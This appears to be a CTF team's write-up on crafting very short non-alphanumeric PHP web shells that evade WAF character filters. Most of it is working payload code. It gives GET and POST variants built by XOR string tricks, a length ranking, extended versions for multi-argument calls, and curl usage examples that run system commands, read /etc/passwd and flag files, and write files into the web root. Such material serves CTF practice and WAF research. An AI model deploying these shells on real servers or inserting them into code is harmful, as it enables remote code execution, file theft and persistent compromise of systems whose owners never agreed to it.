# Non-Alphanumeric WebShell in PHP

The main goal of a php shell is that you can execute code on the server from the outside.

## Intro
This can happen via a normal eval shell or with a tiny shell like this:
```php
<?=`$_GET[1]`?>
```
The downside is that the most WAFs at a CTF filter alot of available chars out to make the exploitation harder.

Common chars to be blocked or filtered are 
```
"'`a-zA-Z
```

To be still able to deploy a working shell there are a few things we need to do.

At first there are already non-alphanumeric shells out in the wild but the ones I have seen had one
thing in common they needed Quotation marks to create a string once to craft letters out of it.

## Idea

So I thought to myself, that it would be a quite cool idea to develop a shell which could avoid that
and still work the same way.
That's the first Solution I came up with:

```php
<?=0;$_=[];$_.=[];$_=${(($_[0]^(0 .$_[1]))^(($_[0]^(6 .$_[1]))^($_[3]^(8 .$_[1])))).($_[3]^(1 .$_[1])).($_[4]^(6 .$_[1])).($_[3]^(2 .$_[1])).($_[3]^(5 .$_[1]))};$_[0]($_[1]);
```

Not optimal at all but it works, it crafts a string element at the start from an Array which results in a
string with the value "Array" which then can be crafted in \_POST by the xor operator.

| Char X | Char Y | Result |
|--------|--------|--------|
| A      | 0      | q      |
| A      | 6      | w      |
| q      | w      | 0x06   |
| a      | 8      | Y      |
| 0x06   | Y      | _      |
| a      | 1      | P      |
| y      | 6      | O      |
| a      | 2      | S      |
| a      | 5      | T      |

Which resulted in \_POST and then can be used to run functions with arguments over code. 
(This feature is present since php7)

And can be used like this:

```php
// $_ = ${'_POST'}
$_[0]($_[1]); // Equals to $_POST[0]($_POST[1]) => can be system('ls')
```

## Shell

That's quite cool but it was so big that it would hit different waf rules such as length restrictions.
So I started to optimize the code, I did this by restructuring the code and remove parts which are not needed.
The end result was:
```php
<?=$_=[]..1;$_=${$_[6].$_[3].$_[4].$_[3].$_[3]^($_^$_[5]).+1625};$_[0]($_[1]);
```

So you can send a request such as `0=system&1=cat /etc/passwd` over post

## Optimization

After some time has passed i started to notice that there are different ways to generate the shell base.

In general the minified version from above relies on a cast of an Array into a string.
This can cause not wanted logging or depending on the report mode broken pages.
So i started to investigate how this could be avoided, and found the following Methods:

1. Array into String `[]` => `Array`
2. Infinite result into string `9**999` => `INF`
3. Underscore constant `_` => `_`
4. Long numbers `9**99` => `2.9512665430653E+94`

Based on the found approaches I tried around which method would be the best fitting.
I found out that version 4) would be hard to Exploit due to the nature of the long string.
And the base from `E+` xor into anything would be to long. So I dumped this idea, and started working on the other three:

* Array into String
* Infinite result into string
* Underscore constant

The speciality of the `Underscore constant` is that this will only work on pre php8 
versions since the use of underscore as constant was then removed.

## Array into String (will throw warnings)
**GET**
```php
<?=$_=[]..1;$_=$_[1].$_[1].$_[1].$_[3]^-575..-1;$$_[0]($$_[1]);
```
**POST**
```php
<?=$_=[]..1;$_=$_[1].$_[3].$_[3].$_[3].$_[4]^-1.2.-1;$$_[0]($$_[1]);
```
## Infinite result into string
**GET**
```php
<?=$_=9**999...1;$_=801..-1^($_[4].+92..$_[0])^$_;$$_[0]($$_[1]);
```
**POST**
```php
<?=$_=-9**999...1;$_=4408..-1^$_^$_[3].$_[0].$_[6].$_[0].$_[1];$$_[0]($$_[1]);
```
---
## Underscore constant (deprecated in php8)
**GET**
```php
<?=$_=[]._;$_=_.($_[2].$_[2].$_[3]^575.._);$$_[0]($$_[1]);
```
**POST**
```php
<?=$_=[]._;$_=_.($_[3].$_[4].$_[3].$_[3]^1625.._);$$_[0]($$_[1]);
```
---

## Length Ranking

| Rank | Version                     | Method | Length |
|------|-----------------------------|--------|--------|
| 1    | Underscore constant         | GET    | 58     |
| 2    | Array into String           | GET    | 63     |
| 3    | Infinite result into string | GET    | 65     |
| 4    | Underscore constant         | POST   | 65     |
| 5    | Array into String           | POST   | 68     |
| 6    | Infinite result into string | POST   | 78     |

To query the shells you can use the browser or this snippents:

```bash
curl https://host.ctf.com/shell.php?0=system&1=cat /etc/passwd
```

```bash
curl https://host.ctf.com/shell.php -X POST -F "0=system" -F "1=cat /etc/passwd"
```

## Extend the logic to allow enhanced function calling
Since this is a really simple shell there are some boundaries to it, such as it only allows to call
a function with one argument, and it will by default not print anything except teh function called does.

So for example if the `system` and any other shell functions is unavailable the flag needs to be extracted over 
`file_get_contents` but since this function does not print we need to print the result.

We can do this by extending the logic at the end of each shell presented above `$$_[0]($$_[1]);`.
This needs to be `$$_[0]($$_[1]($$_[2]));` this leads to a possibility to print the result like this:
`0=print_r&1=file_get_contents&2=/opt/flag.txt`

If a other function with more parameters needs to be called the logic needs to be modified with:
`$$_[0]($$_[1],$$_[2]);`.
`0=file_put_contents&1=/var/www/html/info.php&2=<?php phpinfo();?>`

You can cluster these together as you like, advice is that if you exceed more than 3 variable uses of `$$_` you should simplify
the shell to set the `$_` variable to `$$_` so we have `_GET` or `_POST` directly in the variable and can use it like this:
`$_[0]($_[1]);` this reduces the size needed.
Full example of this for the `Underscore constant` Method here:
```php
<?=$_=[]._;$_=${_.($_[2].$_[2].$_[3]^575.._)};$_[0]($_[1]($_[2],$_[3]));
```

This will allow calling of a function with unlimited parameters and print the result:
`"0=print_r&1=call_user_func_array&2=file_put_contents&3[]=hello.txt&3[]=testcontent`

---

## Contribute
If you find any other option to generate a string with chars in the range to generate `_GET` or `_POST`
I would be happy to include them in the ranking and if possible to optimize them. 
The only restriction is that it needs to be less than `100 chars`

Cli-Ish over and out.

PS: Checkout our cool team page https://pwnprophecy.xyz
